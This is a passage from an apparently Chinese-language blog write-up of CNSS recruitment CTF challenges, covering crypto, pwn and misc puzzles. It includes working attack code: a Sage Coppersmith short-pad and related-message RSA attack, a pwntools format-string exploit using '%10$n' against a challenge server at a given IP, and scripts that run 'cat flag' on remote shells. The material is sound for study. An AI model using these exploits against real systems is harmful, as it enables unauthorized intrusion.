x = p.recvline()
prm = int(x.decode()[8:])
print(x)
print(prm)
nms = []
rss = []
t = 300

for i in range(t):
	p.recv()
	p.sendline(&#34;1&#34;.encode())
	p.recv()
	x = p.recvline().decode()
	#print(x)
	pos = 0
	m = len(x)
	for j in range(75, m):
		if x[j] == &#39;,&#39;:
			pos = j
	nms.append(int(x[5:pos]))
	rss.append(int(x[pos&#43;2:len(x)-2]))

print(&#34;{t} Done&#34;)
secret = -1
aa = []
bb = []
for i in range(t):
	aa = []
	for j in range(t):
		aa.append(pow(nms[i], j, prm))
	aa.append(rss[i])
	bb.append(aa)
#print(bb)
print(&#34;Start solving...&#34;)
solves = calculate_parameter(bb, prm, t)
print(solves)
secret = solves[0]
while not is_prime(secret):
	secret = secret &#43; prm
print(secret)
print(&#34;DONE!!!!&#34;)
print(p.recv())
p.sendline(&#34;2&#34;.encode())
print(p.recv())
p.sendline(str(secret).encode())
print(p.recv())
print(p.recv())
```

`cnss{Lagrange_i5_one_of_My_favour1te}`

### RSA II 

第一层e很大，推测是一个低解密指数攻击。但是n被factordb直接草出来了，咋回事呢。

第二层是一个裸的`Coppersmith&#39;s short padding attack`

```python
def short_pad_attack(c1, c2, e, n):
    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))
    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))
    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))

    g1 = x^e - c1
    g2 = (x&#43;y)^e - c2

    q1 = g1.change_ring(PRZZ)
    q2 = g2.change_ring(PRZZ)

    h = q2.resultant(q1)
    h = h.univariate_polynomial()
    h = h.change_ring(PRx).subs(y=xn)
    h = h.monic()

    kbits = n.nbits()//(2*e*e)
    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.5

    return diff

def related_message_attack(c1, c2, diff, e, n):
    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))
    g1 = x^e - c1
    g2 = (x&#43;diff)^e - c2
    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()

    return -gcd(g1, g2)[0]


c1 = 25273007066020189408109545229904933542261476876009872439710113415858837573395525630415777935344105797142851844145072854811848998350900372253971849285971326186079657861753281055419024685971559366012439288855412385839773710368571132729119276524681516954047015289030441158082956015073955156160324687579087140475
c2 = 59742662912819263048476842525911792774606722595876218353030983190479211608519746735628199156539097538888609903705813533259650335449835222582640654777700444326609516992455668845647841850293730999545553827474883338490920161461753350303815384773788647536170704446255770720919964851226435888665577313224159779663
n = 67530919003139966773553200011128742490294797009276982165948531486788511785120120505106383097675618844859048245902703407886773958024692000896590916622934616822563863757961613349221514066937957870378716994349709221655837122691033725689519576287720351954630419028668871186060611604084354574970069046834491765983
e = 7
diff = short_pad_attack(c1, c2, e, n)
M = related_message_attack(c1, c2, diff, e, n)
print(M)
```

这是一个sage代码。

`cnss{0x10001_getPrime_invert_pow_long_to_bytes}`

### 一些对没开的题的推测做法

#### RSA I

这个题应该是搜索剪枝一下可以直接出p和q

#### CNSS Crypto Service

这个题网上是有现成的解法的。完全一模一样的题目。

#### 大大超人的代码Ⅳ

我推测我大大超人的代码Ⅲ的做法是可以通过这个题的。加个求原根的代码?

## Pwn

这次的Pwn我只做了一开始放的那些题，后面放的题全都没看，，

### 0x01 Net cat

我怎么不记得我做过这题？不会是nc一下直接出结果吧

`cnss{The_first_step_of_Pwn!}`

### 0xFF roshambo

有手就行

```python
from pwn import *

p = remote(&#39;120.25.225.38&#39;, 2556)
print(p.recv())
print(p.recv())
p.send(&#39;\n&#39;)

for i in range(50):
	str = p.recv().decode()
	print(str)
	if i &lt; 9:
		pos = 9
	else:
		pos = 10
	if str[pos] == &#39;r&#39;:
		p.sendline(&#34;cloth&#34;.encode())
	if str[pos] == &#39;s&#39;:
		p.sendline(&#34;rock&#34;.encode())
	if str[pos] == &#39;c&#39;:
		p.sendline(&#34;scissors&#34;.encode())

print(p.recv())
p.sendline(&#34;cat flag&#34;.encode())
print(p.recv())
print(p.recv())
print(p.recv())
```

`cnss{Just_a_easy_case_of_pwn_tools}`

### 0x02 Baby_ROP

ROP。这个题代码我好像没存。

`cnss{The_first_step_of_Pwn!}`

### 0x03 抽奖

格式化字符串漏洞。详见代码

```python
from pwn import *
p = remote(&#34;120.25.225.38&#34;, 3222)
r = p.recv()[21:]
print(r)
r = r[:14]
print(r)
r = int(r, 16)
print(hex(r))
payload = b&#39;a&#39;*42 &#43; b&#39;%10$n&#39; &#43; p64(r)
#首先将&#39;%10$n&#39;部分换成&#39;%10$p&#39;输出地址，前面的数字暴力枚举直到打出的地址正确。
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline(p64(r))
print(p.recv())
print(p.recv())
p.sendline(&#34;cat flag&#34;.encode())
print(p.recv())
```

`cnss{a800bbff3efbf427b55804141ca42a51}`

## Misc

本来都打算军训期间不写题了，但这些题确实蛮有意思又忍不住开了几个。

### Hello World - 1

```c
#include &lt;stdio.h&gt;
int main() {
	puts(&#34;Hi, CNSS!&#34;);
}
```

不会有人看不懂吧

### Hello World - 2

```c
#include &lt;stdio.h&gt;
int main() {
	putchar(72);
	putchar(105);
	putchar(44);
	putchar(32);
	putchar(67);
	putchar(78);
	putchar(83);
	putchar(83);
	putchar(33);
}
```

转化成ASCII码输出就是了

### Hello World - 3

```c
#include &lt;stdio.h&gt;
int main() {
	while(puts(&#34;Hi, CNSS!&#34;) &amp;&amp; 0) {}
}
```

一看就懂

### MOD 3

有意思。

首先我不会做，但我知道我的编译器一定会做（众所周知汇编代码没有模运算）。首先写如下程序：

```c
int main() {
	int x = 114514;
	x = x % 3;
}
```

编译成exe，用ida逆向，然后再翻译回C语言：

```c
int mod3(int x) {
	unsigned long long t = 2863311531;
	return x - ((x * t) &gt;&gt; 33) * 3;
}
```

好神奇，我也不知道为什么会这样。

但是其中不能出现`-`和`*`，考虑使用位运算代替。

首先考虑`-`。众所周知，`-a = ~a&#43;1`（补码），可以转化成加法。

然后考虑`*`。众所周知，`&lt;&lt;`操作可以让一个数乘上2的整数次幂，而t是常数，考虑直接二进制分解。

然后我们的代码变成了这样：

```c
int mod3(int x) {
	unsigned long long ans = x;
	ans = (ans&#43;(ans&lt;&lt;1)&#43;(ans&lt;&lt;3)&#43;(ans&lt;&lt;5)&#43;(ans&lt;&lt;7)&#43;(ans&lt;&lt;9)&#43;(ans&lt;&lt;11)&#43;(ans&lt;&lt;13)&#43;(ans&lt;&lt;15)&#43;(ans&lt;&lt;17)&#43;(ans&lt;&lt;19)&#43;(ans&lt;&lt;21)&#43;(ans&lt;&lt;23)&#43;(ans&lt;&lt;25)&#43;(ans&lt;&lt;27)&#43;(ans&lt;&lt;29)&#43;(ans&lt;&lt;31)); //ans = ans * t;
	ans &gt;&gt;= 33;
	ans = (ans&lt;&lt;1)&#43;ans; //ans *= 3
	ans = ~ans&#43;1; //ans = -ans
	ans = x &#43; ans;
}
```

（其实我的代码并不是这样写的，为了方便理解我进行了一个分步。）

本来按理来说到这里就大功告成了， 但是我负数算爆了。因为我正数完全都彳亍，所以考虑先取绝对值，然后到最后再负回来。

百度一下。`abs(x) = (x ^ (x &gt;&gt; 31)) &#43; (~(x &gt;&gt; 31)&#43;1)`（用前文方法转化减法）

但是我们不能使用if。咋办呢。考虑取`x`的符号位`sgn`，则`sgn = ((unsigned) x &gt;&gt; 31)`（负数为1，正数为0）

考虑构造一个数`s`，这个数的每一位都是`sgn`（即若x是正数s为全0，若x为负数s为全1）

假设答案是ans，则我们只需要`ans = ((~s)&amp;ans)&#43;(s&amp;(~ans&#43;1));`即可实现和if等价的效果（可以自己推一推）

如何构造`s`呢？

当然，你可以`s=sgn&#43;(sgn&lt;&lt;1)&#43;(sgn&lt;&lt;2)&#43;(sgn&lt;&lt;3)...........&#43;(sgn&lt;&lt;31)`，但这样就一瞬超过符号个数限制了。考虑倍增构造：

```c
s=sgn;
s=(s&lt;&lt;1)&#43;s; //11或00
s=(s&lt;&lt;2)&#43;s; //1111或0000
s=(s&lt;&lt;4)&#43;s; //11111111或00000000
s=(s&lt;&lt;8)&#43;s; //同理
s=(s&lt;&lt;16)&#43;s;//同理
```

得到完整代码：

```c
int mod3(int x) {
	int s = ((unsigned)x&gt;&gt;31);
    unsigned long long ans = (x ^ (x &gt;&gt; 31)) &#43; (~(x &gt;&gt; 31)&#43;1);
    x = ans;
    s=(s&lt;&lt;1)&#43;s; s=(s&lt;&lt;2)&#43;s; s=(s&lt;&lt;4)&#43;s; s=(s&lt;&lt;8)&#43;s; s=(s&lt;&lt;16)&#43;s;
	ans = ((ans&#43;(ans&lt;&lt;1)&#43;(ans&lt;&lt;3)&#43;(ans&lt;&lt;5)&#43;(ans&lt;&lt;7)&#43;(ans&lt;&lt;9)&#43;(ans&lt;&lt;11)&#43;(ans&lt;&lt;13)&#43;(ans&lt;&lt;15)&#43;(ans&lt;&lt;17)&#43;(ans&lt;&lt;19)&#43;(ans&lt;&lt;21)&#43;(ans&lt;&lt;23)&#43;(ans&lt;&lt;25)&#43;(ans&lt;&lt;27)&#43;(ans&lt;&lt;29)&#43;(ans&lt;&lt;31))&gt;&gt;33);
	ans = ~((ans&lt;&lt;1)&#43;ans)&#43;1&#43;x;
  	ans = ((~s)&amp;ans)&#43;(s&amp;(~ans&#43;1));
    return ans; 
}
```

出了一些问题，第一个是符号有整整61个刚好超过，第二个是当x=-2147483648的时候绝对值部分会取爆。修复一下：

```c
int mod3(int x) {
	long long x2 = x;
	int s = ((unsigned)x2&gt;&gt;31);
	int s2 = (x2 &gt;&gt; 31); //减少一次右移
    unsigned long long ans = (x2 ^ s2) &#43; (~s2&#43;1);
    x2 = ans;
    s=(s&lt;&lt;1)&#43;s; s=(s&lt;&lt;2)&#43;s; s=(s&lt;&lt;4)&#43;s; s=(s&lt;&lt;8)&#43;s; s=(s&lt;&lt;16)&#43;s;
	ans = ((ans&#43;(ans&lt;&lt;1)&#43;(ans&lt;&lt;3)&#43;(ans&lt;&lt;5)&#43;(ans&lt;&lt;7)&#43;(ans&lt;&lt;9)&#43;(ans&lt;&lt;11)&#43;(ans&lt;&lt;13)&#43;(ans&lt;&lt;15)&#43;(ans&lt;&lt;17)&#43;(ans&lt;&lt;19)&#43;(ans&lt;&lt;21)&#43;(ans&lt;&lt;23)&#43;(ans&lt;&lt;25)&#43;(ans&lt;&lt;27)&#43;(ans&lt;&lt;29)&#43;(ans&lt;&lt;31))&gt;&gt;33);
	ans = ~((ans&lt;&lt;1)&#43;ans)&#43;1&#43;x2;
  	ans = ((~s)&amp;ans)&#43;(s&amp;(~ans&#43;1));
    return ans; 
}
```

得到答案。使用正好60个符号完成本题。



---

> Author: Shino  
> URL: https://www.sh1no.icu/posts/cnssrecruit/  

